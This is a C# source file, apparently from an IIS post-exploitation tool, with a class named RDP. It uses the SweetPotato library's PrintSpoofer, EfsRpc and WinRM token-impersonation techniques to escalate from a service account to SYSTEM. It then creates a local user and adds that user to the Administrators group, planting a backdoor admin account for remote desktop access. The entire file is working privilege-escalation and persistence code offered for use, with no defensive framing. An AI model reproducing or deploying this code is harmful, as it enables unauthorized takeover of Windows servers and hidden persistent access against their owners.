using System;
using System.Text;
using System.Threading;
using static SweetPotato.ImpersonationToken;
using SweetPotato;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Net;
using System.Web;
using System.Threading.Tasks;
using Microsoft.Web.Administration;
using System.Web.Hosting;
using System.Linq;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;

namespace SystemIIS
{
    class RDP
    {
        private string result = "";
        public string username;
        public string password;
        public string GetResult()
        {
            return this.result;
        }

        public RDP(string u, string p)
        {
            username = u;
            password = p;
            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;


            try
            {
                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if (!hasImpersonate && !hasPrimary)
                {
                    result = "necessary privileges missing";
                    return;
                }

                PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);

                if (!potatoAPI.Trigger())
                {
                    mode = PotatoAPI.Mode.EfsRpc;
                    potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
                    if (!potatoAPI.Trigger())
                    {
                        mode = PotatoAPI.Mode.WinRM;
                        potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
                        if (!potatoAPI.Trigger())
                        {
                            result = "Spooler: failed | EfsRPC: failed | WinRM: failed";
                            return;
                        }
                    }
                }

                Task.Run(() =>
                {
                    System.Security.Principal.WindowsIdentity.RunImpersonated(new SafeAccessTokenHandle(potatoAPI.Token), CreateLocalUser);
                    System.Security.Principal.WindowsIdentity.RunImpersonated(new SafeAccessTokenHandle(potatoAPI.Token), AddUserToGroup);
                });
                Thread.Sleep(3000);
                result = "RDP";

            }
            catch (Exception e)
            {
                result = e.Message;
            }
        }

        public void CreateLocalUser()
        {
            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                using (UserPrincipal user = new UserPrincipal(context))
                {
                    user.Name = username;
                    user.SetPassword(password);
                    user.UserCannotChangePassword = false;
                    user.PasswordNeverExpires = false;
                    user.Save();
                }
            }
        }

        public void AddUserToGroup()
        {
            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                using (UserPrincipal user = UserPrincipal.FindByIdentity(context, username))
                using (GroupPrincipal group = GroupPrincipal.FindByIdentity(context, "Administrators"))
                {
                    if (user != null && group != null)
                    {
                        group.Members.Add(user);
                        group.Save();
                    }
                }
            }
        }

    }
}
